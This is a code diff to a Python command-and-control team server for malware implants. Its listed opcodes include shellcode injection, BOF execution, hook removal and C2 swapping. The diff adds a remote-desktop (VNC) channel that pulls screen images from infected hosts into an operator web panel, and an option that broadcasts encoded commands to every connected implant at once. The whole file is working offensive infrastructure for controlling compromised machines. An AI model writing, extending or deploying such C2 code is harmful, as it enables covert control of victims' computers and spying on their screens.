@@ -1,13 +1,16 @@
 import socket, time
-import zlib, re, os, json
+import zlib, re, os, json, binascii
 from time import gmtime, strftime
 import base64, shlex, random, killthread, threading
 from tools import *
 from waitress import serve
-from flask import request, Flask
+from flask import request, Flask, make_response
 app = Flask(__name__)
 app2 = Flask(__name__)
 from requests.structures import CaseInsensitiveDict
+import requests, struct
+from io import BytesIO
+
 stacks = {}
 outs = {}
 living = {}
@@ -16,6 +19,7 @@ SOCKS_SECRET = "VERYSECRET1337"
 HTTP_C2_PORT = 1234
 SOCKS_PORT = 6968
 TEAMSERV_PORT = 6942
+VNC_PORT = 1235
 
 opcodes = """
     PRINT, //1//print [text]
@@ -34,7 +38,8 @@ opcodes = """
     SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
     BOF_EXECUTE, //1//bof_execute file([bof file])
     SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
-    UNHOOK //0//auto remove hooks
+    UNHOOK, //0//auto remove hooks
+    VNC //2//vnc [ip] [port]
 """
 c2s = """
     SOCKS,
@@ -44,9 +49,76 @@ std_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678
 url_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
 def gettime():
     return strftime("%Y-%m-%d %H:%M:%S", gmtime())
+def iphash(ip):
+    return hex(binascii.crc32(socket.inet_aton(ip)))[-4:].upper()
+vncs = {}
+@app2.route("/firstimage.png" , methods=['GET'])
+def firstimg():
+    global vncs
+    try:
+        vid = request.args["id"]
+        vncs[vid].sendall(b"\x67"*9)
+        sz = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        vncs[vid].recv(8, socket.MSG_WAITALL)
+        data = vncs[vid].recv(sz, socket.MSG_WAITALL)
+        response = make_response(data)
+        response.headers.set('Content-Type', 'image/png')    
+        return response
+    except:
+        if vid in vncs:
+            vncs[vid].close()
+            del vncs[vid]
+        return ""
+@app2.route("/image.png" , methods=['GET'])
+def getimg():
+    global vncs
+    try:
+        vid = request.args["id"]
+        vncs[vid].sendall(b"\x68"*9)
+        sz = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        x = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        y = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        data = vncs[vid].recv(sz, socket.MSG_WAITALL)
+        response = make_response(data)
+        response.headers.set('Content-Type', 'image/png')
+        response.headers.set('X', str(x))
+        response.headers.set('Y', str(y))
+        return response
+    except:
+        if vid in vncs:
+            vncs[vid].close()
+            del vncs[vid]
+        return ""
+@app2.route("/vnc/<port>" , methods=['GET'])
+def openvnc(port):
+    f=open("server/ui/vnc.html", "r")
+    r=f.read().replace("{ID}", port)
+    f.close()
+    return r
+@app2.route("/closevnc" , methods=['GET'])
+def closevnc():
+    vid = request.args["id"]
+    if vid in vncs:
+        vncs[vid].close()
+        del vncs[vid]
+        return "Connection closed successfully!"
+    return "Connection not closed"
+
+def vncth():
+    global vncs, VNC_PORT
+    HOST = "0.0.0.0"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, VNC_PORT))
+    s.listen()
+    while True:
+        conn, addr = s.accept()
+        vncs[str(addr[1])] = conn
+
 @app.route("/document/<uid>" , methods=['GET'])
 def command(uid):
     global stacks, allout, outs
+    uid += "-"+iphash(request.remote_addr)
     if "data" in request.args:
         if not uid in outs:
             outs[uid] = ""
@@ -89,7 +161,7 @@ def socksender(conn, ref, uid):
             del stacks[uid]
         time.sleep(0.1)
         
-def sockhand(conn):
+def sockhand(conn, addr):
     global outs, allout, living
     fl = conn.makefile("rb")
     fl.readline()
@@ -97,6 +169,7 @@ def sockhand(conn):
         conn.close()
         return
     uid = fl.readline().decode("charmap").strip("\n")
+    uid += "-"+iphash(addr[0])
     living[uid] = ["SOCKS"]
     if not uid in outs:
         outs[uid] = ""
@@ -128,7 +201,7 @@ def sockserv():
     s.listen()
     while True:
         conn, addr = s.accept()
-        threading.Thread(target=sockhand, args=(conn,)).start()
+        threading.Thread(target=sockhand, args=(conn, addr, )).start()
     s.close()
 
 
@@ -140,10 +213,12 @@ def allo():
     return allout.strip()+"\n"
 @app2.route("/clients" , methods=['GET'])
 def alive():
-    global living
+    global living, vncs
     a = []
     for x in living:
-        a.append(x+" ("+living[x][0]+")")    
+        a.append(x+" ("+living[x][0]+")")
+    for x in vncs:
+        a.append('<a target="_blank" href="/vnc/'+x+'">VNC '+x+'</a>')
     return json.dumps(a)
 @app2.route("/" , methods=['GET'])
 def index():
@@ -168,16 +243,22 @@ def lopcodes():
 @app2.route("/sendcmd" , methods=['GET'])
 def cmdsend():
     global data, stacks, living, c2table
-    if not ("data" in request.args and "target" in request.args):
+    if not ("data" in request.args and "target" in request.args):   
         return "error: invalid request\n"
-    if not request.args["target"] in list(living.keys()):
-        return "error: client not online\n"
+    
     stack = scriptparse(request.args["data"], data, c2table)
-    stacks[request.args["target"]] = pack(random.randint(1, 2**32-1))+xor(construct(stack[0]))
     if stack[1]!="":
         return "ERRORS<br>"+stack[1].replace("\n", "<br>")
+    if request.args["target"] == "all":
+        for x in list(living.keys()):
+            stacks[x] = pack(random.randint(1, 2**32-1))+xor(construct(stack[0]))
+    elif not request.args["target"] in list(living.keys()):
+        return "error: client not online\n"
+    else:
+        stacks[request.args["target"]] = pack(random.randint(1, 2**32-1))+xor(construct(stack[0]))
     return "ok\n"
 threading.Thread(target=livers).start()
 killthread.Thread(target=sockserv).start()
 killthread.Thread(target=httpserv).start()
+killthread.Thread(target=vncth).start()
 serve(app2, host="127.0.0.1", port=TEAMSERV_PORT)
